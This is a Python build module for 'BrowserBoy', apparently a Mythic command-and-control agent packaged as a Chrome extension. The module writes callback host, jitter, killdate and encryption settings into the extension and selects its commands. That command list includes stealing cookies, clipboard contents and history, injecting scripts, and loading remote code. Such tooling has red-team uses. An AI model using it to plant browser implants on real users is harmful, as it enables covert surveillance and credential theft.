"""Build helpers for the BrowserBoy Chrome extension.

This module uses the Python standard library only so tests can import it
without mythic_container.
"""

from __future__ import annotations

import json
import re
import shutil
import zipfile
from pathlib import Path
from typing import Any
from urllib.parse import urlparse

CONFIG_MARKER = "__BROWSERBOY_CONFIG__"
COMMAND_IMPORTS_MARKER = "/* __BROWSERBOY_COMMAND_IMPORTS__ */"
COMMAND_EXPORTS_MARKER = "/* __BROWSERBOY_COMMAND_EXPORTS__ */"

PLACEHOLDER_NAME = "__EXTENSION_NAME__"
PLACEHOLDER_DESCRIPTION = "__EXTENSION_DESCRIPTION__"
PLACEHOLDER_VERSION = "__EXTENSION_VERSION__"
PLACEHOLDER_HOMEPAGE = "__EXTENSION_HOMEPAGE_URL__"
PLACEHOLDER_UPDATE = "__EXTENSION_UPDATE_URL__"

KNOWN_COMMANDS = (
    "sleep",
    "exit",
    "identity",
    "tabs",
    "current",
    "cookies",
    "screenshot",
    "inject",
    "history",
    "bookmarks",
    "downloads",
    "clipboard",
    "request",
    "load",
    "run_loaded",
)


def normalize_uri(path: str) -> str:
    if not path:
        return "/"
    return path if path.startswith("/") else f"/{path}"


def parse_callback_host(raw_host: str, ssl_flag: Any) -> tuple[str, bool]:
    """Return (hostname, ssl).

    Mythic stores the scheme in callback_host (http://host) or as a bare host.
    A port in callback_host is invalid for the http profile. This function
    does not parse ports.
    """
    host = (raw_host or "").strip()
    ssl = _as_bool(ssl_flag)
    if host.startswith("https://"):
        parsed = urlparse(host)
        return parsed.hostname or host[len("https://") :], True
    if host.startswith("http://"):
        parsed = urlparse(host)
        return parsed.hostname or host[len("http://") :], False
    return host, ssl


def _as_bool(value: Any) -> bool:
    if isinstance(value, bool):
        return value
    if value is None:
        return False
    return str(value).strip().lower() in {"1", "true", "t", "yes", "y"}


def aespsk_mode(aespsk: Any) -> str:
    if isinstance(aespsk, dict):
        value = aespsk.get("value", "none")
    else:
        value = aespsk
    if value in (None, "", "none"):
        return "none"
    return str(value)


def build_agent_config(
    payload_uuid: str,
    c2_params: dict[str, Any],
    *,
    extension_name: str = "browserboy",
) -> dict[str, Any]:
    host, ssl = parse_callback_host(
        str(c2_params.get("callback_host", "")),
        c2_params.get("use_ssl", c2_params.get("USE_SSL", False)),
    )

    headers = c2_params.get("headers", {})
    if not isinstance(headers, dict):
        headers = {}

    interval = c2_params.get("callback_interval", 10)
    jitter = c2_params.get("callback_jitter", 10)
    port = c2_params.get("callback_port", 80)

    return {
        "payload_uuid": payload_uuid,
        "callback_host": host,
        "callback_port": int(port) if str(port).isdigit() else port,
        "ssl": ssl,
        "get_uri": normalize_uri(str(c2_params.get("get_uri", "/index"))),
        "post_uri": normalize_uri(str(c2_params.get("post_uri", "/data"))),
        "query_path_name": str(c2_params.get("query_path_name", "q")),
        "headers": headers,
        "callback_interval": int(interval) if str(interval).isdigit() else interval,
        "callback_jitter": int(jitter) if str(jitter).isdigit() else jitter,
        "killdate": str(c2_params.get("killdate", "")),
        "aespsk": aespsk_mode(c2_params.get("AESPSK", "none")),
        "extension_name": extension_name,
    }


def render_command_registry(command_names: list[str]) -> tuple[str, str]:
    names = [n for n in command_names if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", n)]
    imports = "\n".join(
        f'import {{ run as {name} }} from "../commands/{name}.js";' for name in names
    )
    exports = ",\n  ".join(names)
    export_block = f"{exports}," if exports else ""
    return imports, export_block


def stamp_text(template: str, replacements: dict[str, str]) -> str:
    out = template
    for key, value in replacements.items():
        out = out.replace(key, value)
    return out


def stamp_extension(
    source_dir: Path,
    dest_dir: Path,
    *,
    config: dict[str, Any],
    manifest_fields: dict[str, str],
    command_names: list[str],
) -> None:
    if dest_dir.exists():
        shutil.rmtree(dest_dir)
    shutil.copytree(source_dir, dest_dir)

    config_path = dest_dir / "lib" / "config.js"
    config_path.write_text(
        stamp_text(
            config_path.read_text(encoding="utf-8"),
            {CONFIG_MARKER: json.dumps(config, indent=2)},
        ),
        encoding="utf-8",
    )

    imports, exports = render_command_registry(command_names)
    registry_path = dest_dir / "lib" / "commands.js"
    registry_path.write_text(
        stamp_text(
            registry_path.read_text(encoding="utf-8"),
            {
                COMMAND_IMPORTS_MARKER: imports,
                COMMAND_EXPORTS_MARKER: exports,
            },
        ),
        encoding="utf-8",
    )

    manifest_path = dest_dir / "manifest.json"
    manifest_path.write_text(
        stamp_text(
            manifest_path.read_text(encoding="utf-8"),
            {
                PLACEHOLDER_NAME: manifest_fields["name"],
                PLACEHOLDER_DESCRIPTION: manifest_fields["description"],
                PLACEHOLDER_VERSION: manifest_fields["version"],
                PLACEHOLDER_HOMEPAGE: manifest_fields["homepage_url"],
                PLACEHOLDER_UPDATE: manifest_fields["update_url"],
            },
        ),
        encoding="utf-8",
    )

    selected = set(command_names)
    commands_dir = dest_dir / "commands"
    if commands_dir.is_dir():
        for path in commands_dir.glob("*.js"):
            if path.stem not in selected:
                path.unlink()


def zip_extension(extension_dir: Path, zip_path: Path) -> None:
    if zip_path.exists():
        zip_path.unlink()
    with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        for path in sorted(extension_dir.rglob("*")):
            if path.is_file():
                archive.write(path, path.relative_to(extension_dir))
